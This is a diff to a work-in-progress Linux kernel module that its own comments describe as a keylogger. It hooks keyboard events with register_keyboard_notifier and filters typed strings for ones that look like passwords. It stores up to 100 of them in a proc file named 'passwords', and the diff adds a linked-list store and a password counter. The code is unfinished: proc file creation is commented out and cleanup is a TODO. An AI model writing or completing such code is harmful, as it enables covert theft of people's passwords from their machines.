@@ -5,7 +5,10 @@
  * 	   check if it meets password rules:
  * 	   (3 of the 4: lowercase letters, uppercase letters, symbols, numbers)
  * 	3. Save a password that fits #2 in a proc file called "passwords". Save
- * 	   The last 100 potential paswords.
+ * 	   The last 100 potential paswords. We can use a linked list type data
+ * 	   structure or just allocate a ton of space in a list of char*, probably
+ * 	   go with the linked list. A linked list would have bad lookup time but
+ * 	   it would be in 'order' anyways with re writing the passwords after 100
  *
  * 	-  The 2d array called 'keymap' takes [keycode][shift_boolean] to retrieve
  * 	   a letter.
@@ -26,6 +29,32 @@
 #define PROC_FILE_NAME "passwords"
 
 struct notifier_block nb;
+int password_count;
+
+// We want a reference to the password* head
+// TODO create a remove / overwrite with kfree
+void push(struct password** head, char* password_value){
+        // 'current' is a macro :/
+	struct password* curr;
+	struct password* new_node;
+	
+	// Use kfree on this bad boy
+	new_node = (struct password*)kmalloc(sizeof(struct password), GFP_KERNEL);
+	new_node->pw = password_value;
+        new_node->next = NULL;
+        
+	password_count++;
+        if(*head == NULL){
+                *head = new_node;
+                return;
+        }
+
+        curr = *head;
+        while(curr->next != NULL){
+                curr = curr->next;
+        }
+        curr->next = new_node;
+}
 
 ssize_t read_simple(struct file *filp,char *buf,size_t count,loff_t *offp ) 
 {
@@ -38,16 +67,18 @@ struct file_operations proc_fops = {
 
 int kb_notifier_fn(struct notifier_block *pnb, unsigned long action, void* data){
 	struct keyboard_notifier_param *kp = (struct keyboard_notifier_param*)data;
-	printk("Key:  %d  Lights:  %d  Shiftmax:  %x\n", kp->value, kp->ledstate, kp->shift);
+//	printk("Key:  %d  Lights:  %d  Shiftmax:  %x\n", kp->value, kp->ledstate, kp->shift);
 	if(kp->value > 119) return 0;
-
-	printk("Letter: %c\n", *keymap[kp->value][0]);
-
+	// keymap[][] returns a char* since you can have names like '_BACKSPACE_'
+	printk("Letter: %s\n", keymap[kp->value][0]);
+	printk("Number of passwords: %d\n", password_count);
 	
 	return 0;
 }
 
 int init (void) {
+	password_count = 0;
+	
 	nb.notifier_call = kb_notifier_fn;
 	register_keyboard_notifier(&nb);
 	// proc_create(PROC_FILE_NAME,0,NULL,&proc_fops);
